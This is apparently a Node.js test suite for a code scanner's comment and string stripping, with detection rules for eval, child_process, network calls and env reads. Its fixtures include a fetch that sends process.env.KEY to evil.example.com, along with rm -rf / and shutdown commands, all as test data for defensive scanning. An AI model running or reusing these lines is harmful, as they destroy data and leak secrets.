import { test } from 'node:test'
import assert from 'node:assert/strict'

import { stripSource, extractModules } from '../src/scanner.js'
import { CODE_RULES } from '../src/rules.js'

const rule = (id) => CODE_RULES.find((r) => r.id === id)

/** Strip then report which code rules fire anywhere in the source. */
function firedCodeRules(text) {
  const { lines } = stripSource(text)
  const fired = new Set()
  for (const { code } of lines) {
    for (const r of CODE_RULES) if (r.pattern.test(code)) fired.add(r.id)
  }
  return fired
}

test('危险 API 写在注释里不触发规则', () => {
  const fired = firedCodeRules(`
    // eval('rm -rf /') and child_process.exec('x') are documented here
    /* fetch('http://evil.example.com') */
    export function apply(ctx) {}
  `)
  assert.ok(!fired.has('JS-EXEC-EVAL'))
  assert.ok(!fired.has('JS-EXEC-CHILD-PROCESS'))
  assert.ok(!fired.has('JS-NET-CALL'))
})

test('危险 API 写在字符串里不触发代码规则，但被收集为字面量', () => {
  const src = stripSource(`
    const EXAMPLES = [
      "eval('data not code')",
      "child_process.execSync('shutdown -h now')",
      "fetch('http://evil.example.com/steal?k=' + process.env.KEY)",
    ]
  `)
  const fired = new Set()
  for (const { code } of src.lines) for (const r of CODE_RULES) if (r.pattern.test(code)) fired.add(r.id)
  assert.ok(!fired.has('JS-EXEC-EVAL'))
  assert.ok(!fired.has('JS-EXEC-CHILD-PROCESS'))
  assert.ok(!fired.has('JS-NET-CALL'))
  assert.ok(!fired.has('JS-READ-ENV'), 'process.env inside a string must not fire')
  const all = src.literals.map((l) => l.text).join('\n')
  assert.match(all, /evil\.example\.com/)
})

test('真实代码中的危险 API 正常触发', () => {
  const fired = firedCodeRules(`const out = eval(input)\nfetch('http://ok.example.com')\n`)
  assert.ok(fired.has('JS-EXEC-EVAL'))
  assert.ok(fired.has('JS-NET-CALL'))
})

test('模板字符串插值中的代码不会被字面量吞掉', () => {
  const src = stripSource('const cmd = `rm -rf ${targetDir} --no-preserve-root`\nspawn(cmd)')
  const code = src.lines.map((l) => l.code).join('\n')
  assert.match(code, /targetDir/, 'interpolation code must remain visible')
  assert.ok(!code.includes('rm -rf'), 'template chunk text must be blanked from code')
  const fired = firedCodeRules('const cmd = `x${eval(expr)}y`')
  assert.ok(fired.has('JS-EXEC-EVAL'), 'eval inside ${} is real code and must fire')
})

test('模板块中的撇号不被误判为字符串起点', () => {
  const src = stripSource("const msg = `it's fine, no string here`")
  assert.equal(src.literals.length, 1, 'the whole chunk is ONE template literal')
  assert.equal(src.literals[0].text, "it's fine, no string here")
})

test('正则字面量内容不参与代码匹配', () => {
  const fired = firedCodeRules("const re = /eval\\(.*\\)/g\nconst div = width / height / 2\n")
  assert.ok(!fired.has('JS-EXEC-EVAL'))
})

test('行号在多行结构中保持准确', () => {
  const src = stripSource('const a = 1\n/* multi\nline */ eval(x)')
  const evalLine = src.lines.find((l) => /eval/.test(l.code))
  assert.equal(evalLine?.n, 3)
})

test('块注释跨行后代码恢复可见', () => {
  const fired = firedCodeRules('/* start\nstill comment\nend */ spawn(cmd)')
  assert.ok(fired.has('JS-EXEC-CHILD-PROCESS'))
})

test('extractModules 识别静态与动态模块引用', () => {
  const src = stripSource(`
    import { execSync } from 'node:child_process'
    import 'side-effect-pkg'
    const fs = require('fs')
    const late = require(nameFromConfig)
    const dynamic = await import('https://example.com/module.js')
  `)
  const { specifiers, dynamicRequires } = extractModules(src)
  assert.ok(specifiers.includes('node:child_process'))
  assert.ok(specifiers.includes('fs'))
  assert.ok(specifiers.includes('side-effect-pkg'))
  assert.ok(dynamicRequires >= 1)
})
